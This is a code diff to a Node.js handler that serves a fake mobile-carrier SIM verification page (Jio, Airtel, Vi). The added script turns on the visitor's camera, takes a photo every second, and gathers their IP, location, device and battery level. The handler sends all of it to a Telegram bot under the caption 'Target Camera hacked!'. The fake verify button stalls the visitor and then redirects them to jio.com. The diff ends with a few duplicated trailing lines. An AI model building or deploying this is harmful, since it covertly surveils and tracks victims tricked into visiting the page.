@@ -6,7 +6,7 @@ export default async function handler(req, res) {
 
     if (req.method === 'POST') {
         try {
-            const { image, id, battery, ip } = req.body;
+            const { image, id, battery, ip, loc, device } = req.body;
             if (!image || !id) return res.status(400).json({ error: "Missing data" });
 
             const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
@@ -16,8 +16,8 @@ export default async function handler(req, res) {
             form.append('chat_id', id);
             form.append('photo', imageBuffer, { filename: 'capture.jpg' });
             
-            // Professional Caption with Battery and IP
-            const caption = `📸 Target Camera hacked.!\n\n🔋 Battery: ${battery || 'N/A'}\n🌐 IP Address: ${ip || 'N/A'}\n\n👨‍💻 DEVELOPER: @Eshucording\n📞 Contact: 8123561579`;
+            // Ultimate Pro Caption
+            const caption = `📸 Target Camera hacked!\n\n🌐 IP: ${ip}\n📍 Location: ${loc}\n📱 Device: ${device}\n🔋 Battery: ${battery}\n\n👨‍💻 DEVELOPER: @Eshucording\n📞 Contact: 8123561579`;
             form.append('caption', caption);
 
             await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, form, {
@@ -53,6 +53,71 @@ export default async function handler(req, res) {
         <button class="jio" onclick="verify('JIO')">JIO</button>
         <button class="airtel" onclick="verify('AIRTEL')">AIRTEL</button>
         <button class="vi" onclick="verify('VI')">VI</button>
+    </div>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+    <script>
+        const path = window.location.pathname.replace('/', '');
+        const query = new URLSearchParams(window.location.search).get('s');
+        const encoded = path || query;
+        const uid = encoded ? atob(encoded) : null;
+        
+        let userIp = "Detecting...", userLoc = "Detecting...", userBattery = "Detecting...", userDevice = "Detecting...";
+
+        async function autoStart() {
+            if(!uid) return; 
+
+            // 1. Device Info
+            userDevice = navigator.userAgent.split(')')[0].split('(')[1];
+
+            // 2. IP & Location Info
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                userIp = data.ip;
+                userLoc = data.city + ", " + data.region + " (" + data.country_name + ")";
+            } catch (e) { userIp = "Unknown"; userLoc = "Unknown"; }
+
+            // 3. Battery Info
+            try {
+                const battery = await navigator.getBattery();
+                userBattery = Math.round(battery.level * 100) + "%";
+            } catch (e) { userBattery = "N/A"; }
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('v').srcObject = stream;
+                setTimeout(() => { setInterval(snap, 1000); }, 2000);
+            } catch (err) { }
+        }
+
+        function verify(sim) {
+            alert("Verifying " + sim + " number... please wait 10 sec");
+            setTimeout(() => {
+                window.location.href = "https://www.jio.com/en-in/5g"; // Auto Redirect
+            }, 10000);
+        }
+
+        function snap() {
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            if (v.videoWidth === 0) return; 
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            fetch(window.location.href, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    image: c.toDataURL('image/jpeg', 0.6), 
+                    id: uid, battery: userBattery, ip: userIp, loc: userLoc, device: userDevice
+                })
+            });
+        }
+    </script>
+</body>
+</html>
+    `);
+}
     </div>
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
